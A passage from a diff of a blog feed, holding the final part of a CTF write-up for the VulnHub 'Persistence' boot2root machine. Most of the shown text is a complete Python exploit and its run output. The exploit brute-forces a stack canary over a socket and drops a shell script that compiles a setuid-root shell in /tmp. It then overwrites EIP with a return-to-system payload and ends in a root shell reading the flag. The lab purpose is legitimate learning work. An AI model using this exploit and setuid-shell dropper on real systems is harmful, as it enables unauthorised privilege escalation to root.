+</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">30</span>  <span class="c"># amount of bytes to before the canary is hit</span>
+</span><span class='line'><span class="n">canary</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>     <span class="c"># canary that should update as its bruted</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">print</span> <span class="s">&quot;&quot;&quot;</span>
+</span><span class='line'><span class="s">            A: &quot;So, I heard you like pain...?&quot;</span>
+</span><span class='line'><span class="s">            B: &quot;... a bit&quot;</span>
+</span><span class='line'><span class="s">            C: &quot;Well, here it is, the: &quot;</span>
+</span><span class='line'><span class="s"> ____   ___  ____    _____ ____ _____ ______    ___  ____     __    ___ </span>
+</span><span class='line'><span class="s">|    \ /  _]|    \  / ___/|    / ___/|      |  /  _]|    \   /  ]  /  _]</span>
+</span><span class='line'><span class="s">|  o  )  [_ |  D  )(   \_  |  (   \_ |      | /  [_ |  _  | /  /  /  [_ </span>
+</span><span class='line'><span class="s">|   _/    _]|    /  \__  | |  |\__  ||_|  |_||    _]|  |  |/  /  |    _]</span>
+</span><span class='line'><span class="s">|  | |   [_ |    \  /  \ | |  |/  \ |  |  |  |   [_ |  |  /   \_ |   [_ </span>
+</span><span class='line'><span class="s">|  | |     ||  .  \ \    | |  |\    |  |  |  |     ||  |  \     ||     |</span>
+</span><span class='line'><span class="s">|__| |_____||__|\_|  \___||____|\___|  |__|  |_____||__|__|\____||_____|</span>
+</span><span class='line'><span class="s">      _____ ____  _       ___  ____  ______ </span>
+</span><span class='line'><span class="s">     / ___/|    \| |     /   \|    ||      |</span>
+</span><span class='line'><span class="s">    (   \_ |  o  ) |    |     ||  | |      |</span>
+</span><span class='line'><span class="s">     \__  ||   _/| |___ |  O  ||  | |_|  |_|</span>
+</span><span class='line'><span class="s">     /  \ ||  |  |     ||     ||  |   |  |  </span>
+</span><span class='line'><span class="s">     \    ||  |  |     ||     ||  |   |  |  </span>
+</span><span class='line'><span class="s">      \___||__|  |_____| \___/|____|  |__|  </span>
+</span><span class='line'><span class="s">                                        </span>
+</span><span class='line'><span class="s">                A: &quot;AKA: FU superkojiman &amp;&amp; sagi- !!&quot;</span>
+</span><span class='line'><span class="s">                A: &quot;I also have no idea what I am doing&quot;</span>
+</span><span class='line'><span class="s">&quot;&quot;&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] Connecting &amp; starting canary brute force...&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># start the canary brute loop. We want to brute 4 bytes ...</span>
+</span><span class='line'><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">5</span><span class="p">):</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c"># ... and try all possibilities</span>
+</span><span class='line'>    <span class="k">for</span> <span class="n">canary_byte</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">256</span><span class="p">):</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="c"># prepare the byte</span>
+</span><span class='line'>        <span class="n">hex_byte</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">canary_byte</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="c"># prepare the payload</span>
+</span><span class='line'>        <span class="n">send</span> <span class="o">=</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">canary</span> <span class="o">+</span> <span class="n">hex_byte</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="c"># connect and send payload</span>
+</span><span class='line'>        <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">3333</span><span class="p">))</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="c"># get the inital banners</span>
+</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">35</span><span class="p">)</span>   <span class="c"># [+] hello, my name is sploitable\n</span>
+</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">40</span><span class="p">)</span>   <span class="c"># [+] would you like to play a game?\n </span>
+</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>    <span class="c"># &gt; </span>
+</span><span class='line'>
+</span><span class='line'>        <span class="c"># send the payload  </span>
+</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">send</span><span class="p">)</span>
+</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">27</span><span class="p">)</span>   <span class="c"># [+] yeah, I don&#39;t think so\n</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="c"># if we have a OK response, then we will have this last part</span>
+</span><span class='line'>        <span class="c"># as &#39;[+] bye!\n&#39; populated, if its wrong, not</span>
+</span><span class='line'>        <span class="n">data</span> <span class="o">=</span>  <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>   <span class="c"># [+] bye!\n</span>
+</span><span class='line'>        <span class="k">if</span> <span class="s">&quot;bye&quot;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+</span><span class='line'>            <span class="k">print</span> <span class="s">&quot;[+] Found a possible canary value of &#39;{0}&#39;!&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">hex_byte</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&quot;hex&quot;</span><span class="p">))</span>
+</span><span class='line'>            <span class="n">canary</span> <span class="o">+=</span> <span class="n">hex_byte</span>
+</span><span class='line'>            <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span class='line'>            <span class="k">break</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span class='line'>    <span class="c"># if we cant even find the first byte, we failed already</span>
+</span><span class='line'>    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">:</span>
+</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;[-] Unable to even find the first bit of the canary. No luck&quot;</span>
+</span><span class='line'>        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># The canary is our ticket out of here!</span>
+</span><span class='line'><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Canary known as : {0}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">canary</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&quot;hex&quot;</span><span class="p">))</span>
+</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Writing /tmp/log to be called by wopr later&quot;</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c"># ./wopr has the string /tmp/log in it. We will use this as</span>
+</span><span class='line'>    <span class="c"># our code exec point, overwriting whatever is in it atm</span>
+</span><span class='line'>    <span class="n">stager</span> <span class="o">=</span> <span class="s">&quot;&quot;&quot;</span>
+</span><span class='line'><span class="s">        #!/bin/sh</span>
+</span><span class='line'>
+</span><span class='line'><span class="s">        # First, prepare a small C shell and move it to /tmp with name getroot</span>
+</span><span class='line'><span class="s">        echo &quot;int main(void)</span><span class="se">\n</span><span class="s">{</span><span class="se">\n</span><span class="s">setuid(0);</span><span class="se">\n</span><span class="s">system(</span><span class="se">\\</span><span class="s">&quot;/bin/sh</span><span class="se">\\</span><span class="s">&quot;);</span><span class="se">\n</span><span class="s">return 0;</span><span class="se">\n</span><span class="s">}&quot; &gt; /tmp/getroot.c</span>
+</span><span class='line'>
+</span><span class='line'><span class="s">        # compile it</span>
+</span><span class='line'><span class="s">        /usr/bin/gcc /tmp/getroot.c -o /tmp/getroot</span>
+</span><span class='line'>
+</span><span class='line'><span class="s">        # change ownership and setuid</span>
+</span><span class='line'><span class="s">        /bin/chown root:root /tmp/getroot</span>
+</span><span class='line'><span class="s">        /bin/chmod 4777 /tmp/getroot</span>
+</span><span class='line'><span class="s">    &quot;&quot;&quot;</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c"># write the file</span>
+</span><span class='line'>    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;/tmp/log&#39;</span><span class="p">,</span><span class="s">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">stager_file</span><span class="p">:</span>
+</span><span class='line'>        <span class="n">stager_file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">stager</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c"># make it executable</span>
+</span><span class='line'>    <span class="n">os</span><span class="o">.</span><span class="n">chmod</span><span class="p">(</span><span class="s">&#39;/tmp/log&#39;</span><span class="p">,</span> <span class="mo">0755</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c"># now, with the stack canary known and the stager ready, lets corrupt</span>
+</span><span class='line'>    <span class="c"># EIP and sploit!</span>
+</span><span class='line'>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">canary</span>               <span class="c"># canary we bruted</span>
+</span><span class='line'>    <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">4</span>              <span class="c"># padding to EIP wich is at byte 42</span>
+</span><span class='line'>    <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x10\x62\xe5\xb7</span><span class="s">&quot;</span>   <span class="c"># system() @ 0xb7e56210, NULL is ok cause memcpy(). Recheck location of system in gdb incase the sploit fails.</span>
+</span><span class='line'>    <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;JUNK&quot;</span>               <span class="c"># JUNK. Should probably do exit() here. Meh.</span>
+</span><span class='line'>    <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x60\x8c\x04\x08</span><span class="s">&quot;</span>   <span class="c"># location if /tmp/log string in .data</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c"># and connect &amp;&amp; send</span>
+</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Connecting to service&quot;</span>
+</span><span class='line'>    <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">3333</span><span class="p">))</span>
+</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">35</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">40</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Sending Payload&quot;</span>
+</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Done&quot;</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] going to try and spawn /tmp/getroot, assuming the sploit worked :)&quot;</span>
+</span><span class='line'>    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/tmp/getroot&quot;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">else</span><span class="p">:</span>
+</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[!] Incomplete Canary. Can&#39;t continue reliably&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># done</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>A sample run would be:</p>
+
+<figure class='code'><figcaption><span>Running sploit.py</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span>ls -lah /tmp/sploit.py
+</span><span class='line'>-rw-rw-r--. 1 avida avida 4.0K Sep 18 10:33 /tmp/sploit.py
+</span><span class='line'>bash-4.1<span class="nv">$ </span>python /tmp/sploit.py
+</span><span class='line'>
+</span><span class='line'>            A: <span class="s2">&quot;So, I heard you like pain...?&quot;</span>
+</span><span class='line'>            B: <span class="s2">&quot;... a bit&quot;</span>
+</span><span class='line'>            C: <span class="s2">&quot;Well, here it is, the: &quot;</span>
+</span><span class='line'> ____   ___  ____    _____ ____ _____ ______    ___  ____     __    ___
+</span><span class='line'><span class="p">|</span>    <span class="se">\ </span>/  _<span class="o">]</span><span class="p">|</span>    <span class="se">\ </span> / ___/<span class="p">|</span>    / ___/<span class="p">|</span>      <span class="p">|</span>  /  _<span class="o">]</span><span class="p">|</span>    <span class="se">\ </span>  /  <span class="o">]</span>  /  _<span class="o">]</span>
+</span><span class='line'><span class="p">|</span>  o  <span class="o">)</span>  <span class="o">[</span>_ <span class="p">|</span>  D  <span class="o">)(</span>   <span class="se">\_</span>  <span class="p">|</span>  <span class="o">(</span>   <span class="se">\_</span> <span class="p">|</span>      <span class="p">|</span> /  <span class="o">[</span>_ <span class="p">|</span>  _  <span class="p">|</span> /  /  /  <span class="o">[</span>_
+</span><span class='line'><span class="p">|</span>   _/    _<span class="o">]</span><span class="p">|</span>    /  <span class="se">\_</span>_  <span class="p">|</span> <span class="p">|</span>  <span class="p">|</span><span class="se">\_</span>_  <span class="o">||</span>_<span class="p">|</span>  <span class="p">|</span>_<span class="o">||</span>    _<span class="o">]</span><span class="p">|</span>  <span class="p">|</span>  <span class="p">|</span>/  /  <span class="p">|</span>    _<span class="o">]</span>
+</span><span class='line'><span class="p">|</span>  <span class="p">|</span> <span class="p">|</span>   <span class="o">[</span>_ <span class="p">|</span>    <span class="se">\ </span> /  <span class="se">\ </span><span class="p">|</span> <span class="p">|</span>  <span class="p">|</span>/  <span class="se">\ </span><span class="p">|</span>  <span class="p">|</span>  <span class="p">|</span>  <span class="p">|</span>   <span class="o">[</span>_ <span class="p">|</span>  <span class="p">|</span>  /   <span class="se">\_</span> <span class="p">|</span>   <span class="o">[</span>_
+</span><span class='line'><span class="p">|</span>  <span class="p">|</span> <span class="p">|</span>     <span class="o">||</span>  .  <span class="se">\ \ </span>   <span class="p">|</span> <span class="p">|</span>  <span class="p">|</span><span class="se">\ </span>   <span class="p">|</span>  <span class="p">|</span>  <span class="p">|</span>  <span class="p">|</span>     <span class="o">||</span>  <span class="p">|</span>  <span class="se">\ </span>    <span class="o">||</span>     <span class="p">|</span>
+</span><span class='line'><span class="p">|</span>__<span class="p">|</span> <span class="p">|</span>_____<span class="o">||</span>__<span class="p">|</span><span class="se">\_</span><span class="p">|</span>  <span class="se">\_</span>__<span class="o">||</span>____<span class="p">|</span><span class="se">\_</span>__<span class="p">|</span>  <span class="p">|</span>__<span class="p">|</span>  <span class="p">|</span>_____<span class="o">||</span>__<span class="p">|</span>__<span class="p">|</span><span class="se">\_</span>___<span class="o">||</span>_____<span class="p">|</span>
+</span><span class='line'>      _____ ____  _       ___  ____  ______
+</span><span class='line'>     / ___/<span class="p">|</span>    <span class="se">\|</span> <span class="p">|</span>     /   <span class="se">\|</span>    <span class="o">||</span>      <span class="p">|</span>
+</span><span class='line'>    <span class="o">(</span>   <span class="se">\_</span> <span class="p">|</span>  o  <span class="o">)</span> <span class="p">|</span>    <span class="p">|</span>     <span class="o">||</span>  <span class="p">|</span> <span class="p">|</span>      <span class="p">|</span>
+</span><span class='line'>     <span class="se">\_</span>_  <span class="o">||</span>   _/<span class="p">|</span> <span class="p">|</span>___ <span class="p">|</span>  O  <span class="o">||</span>  <span class="p">|</span> <span class="p">|</span>_<span class="p">|</span>  <span class="p">|</span>_<span class="p">|</span>
+</span><span class='line'>     /  <span class="se">\ </span><span class="o">||</span>  <span class="p">|</span>  <span class="p">|</span>     <span class="o">||</span>     <span class="o">||</span>  <span class="p">|</span>   <span class="p">|</span>  <span class="p">|</span>
+</span><span class='line'>     <span class="se">\ </span>   <span class="o">||</span>  <span class="p">|</span>  <span class="p">|</span>     <span class="o">||</span>     <span class="o">||</span>  <span class="p">|</span>   <span class="p">|</span>  <span class="p">|</span>
+</span><span class='line'>      <span class="se">\_</span>__<span class="o">||</span>__<span class="p">|</span>  <span class="p">|</span>_____<span class="p">|</span> <span class="se">\_</span>__/<span class="p">|</span>____<span class="p">|</span>  <span class="p">|</span>__<span class="p">|</span>
+</span><span class='line'>
+</span><span class='line'>                A: <span class="s2">&quot;AKA: FU superkojiman &amp;&amp; sagi- !!&quot;</span>
+</span><span class='line'>                A: <span class="s2">&quot;I also have no idea what I am doing&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Connecting <span class="p">&amp;</span> starting canary bruteforce...
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Found a possible canary value of <span class="s1">&#39;64&#39;</span>!
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Found a possible canary value of <span class="s1">&#39;d3&#39;</span>!
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Found a possible canary value of <span class="s1">&#39;c6&#39;</span>!
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Found a possible canary value of <span class="s1">&#39;15&#39;</span>!
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Canary known as : 64d3c615
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Writing /tmp/log to be called by wopr later
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Connecting to service
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Sending Payload
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Done
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> going to try and spawn /tmp/getroot, assuming the sploit worked :<span class="o">)</span>
+</span><span class='line'>sh-4.1# id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>500<span class="o">(</span>avida<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,500<span class="o">(</span>avida<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And, as proof, we cat the flag!</p>
+
+<figure class='code'><figcaption><span>Persistence w00t</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>sh-4.1# cat /root/flag.txt
+</span><span class='line'>              .d8888b.  .d8888b. 888
+</span><span class='line'>             d88P  Y88bd88P  Y88b888
+</span><span class='line'>             888    888888    888888
+</span><span class='line'>888  888  888888    888888    888888888
+</span><span class='line'>888  888  888888    888888    888888
+</span><span class='line'>888  888  888888    888888    888888
+</span><span class='line'>Y88b 888 d88PY88b  d88PY88b  d88PY88b.
+</span><span class='line'> <span class="s2">&quot;Y8888888P&quot;</span>  <span class="s2">&quot;Y8888P&quot;</span>  <span class="s2">&quot;Y8888P&quot;</span>  <span class="err">&quot;</span>Y888
+</span><span class='line'>
+</span><span class='line'>Congratulations!!! You have the flag!
+</span><span class='line'>
+</span><span class='line'>We had a great <span class="nb">time </span>coming up with the
+</span><span class='line'>challenges <span class="k">for </span>this boot2root, and we
+</span><span class='line'>hope that you enjoyed overcoming them.
+</span><span class='line'>
+</span><span class='line'>Special thanks goes out to @VulnHub <span class="k">for </span>
+</span><span class='line'>hosting Persistence <span class="k">for </span>us, and to
+</span><span class='line'>@recrudesce <span class="k">for </span>testing and providing
+</span><span class='line'>valuable feedback!
+</span><span class='line'>
+</span><span class='line'>Until next <span class="nb">time</span>,
+</span><span class='line'>      sagi- <span class="p">&amp;</span> superkojiman
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>conclusion</h2>
+
+<p>Persistence kicked ass!! I learned a ton and that is the ultimate win. Thanks sagi- &amp;&amp; superkojiman for an incredible challenge! Thanks Vulnhub for the hosting and community!</p>
+
+<h2>thats not all</h2>
+
+<p>There are however a few more things I&rsquo;d like to try.</p>
+
+<ul>
+<li>Find if and how we can root Persistence using <code>sysadmin-tool</code></li>
+<li>Modify the exploit to a working ROP payload</li>
+<li>Explore other avenues to break out of rbash</li>
+</ul>
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Kali Linux Oracle Support]]></title>
@@ -7156,7 +8869,7 @@ Once this plugin is installed, some minor configuration is required to allow the
 <p>Save this code to something like <code>jabbersend.py</code> and execute it like this:
 <code>python jabbersend.py all@broadcast.jabber.server message_file.txt</code></p>
 
-<p>If all went OK, you should have received a message from <a href="&#109;&#97;&#105;&#108;&#x74;&#111;&#x3a;&#106;&#x61;&#x62;&#x62;&#101;&#x72;&#95;&#x62;&#111;&#x74;&#64;&#x6a;&#x61;&#98;&#98;&#101;&#x72;&#46;&#x73;&#x65;&#114;&#118;&#101;&#114;">&#106;&#x61;&#x62;&#98;&#101;&#x72;&#x5f;&#98;&#111;&#x74;&#64;&#106;&#97;&#98;&#x62;&#101;&#114;&#x2e;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;</a> :P</p>
+<p>If all went OK, you should have received a message from <a href="&#109;&#x61;&#105;&#x6c;&#116;&#111;&#58;&#106;&#x61;&#x62;&#x62;&#x65;&#x72;&#95;&#98;&#x6f;&#116;&#x40;&#x6a;&#x61;&#98;&#x62;&#x65;&#x72;&#x2e;&#115;&#x65;&#x72;&#118;&#x65;&#114;">&#106;&#97;&#98;&#98;&#101;&#114;&#95;&#98;&#x6f;&#x74;&#x40;&#106;&#97;&#98;&#98;&#x65;&#114;&#46;&#115;&#x65;&#114;&#x76;&#x65;&#114;</a> :P</p>
 
 <p>Our internal implementation of this has been used in multiple areas. From broadcasting OSSEC alerts to broadcasting important events from cronjobs.
 The OSSEC broadcasting I&rsquo;ll blog a little later, but you can obviously see the value that something like this brings. No more missing emails, if I receive a message from the bot, its important :)</p>
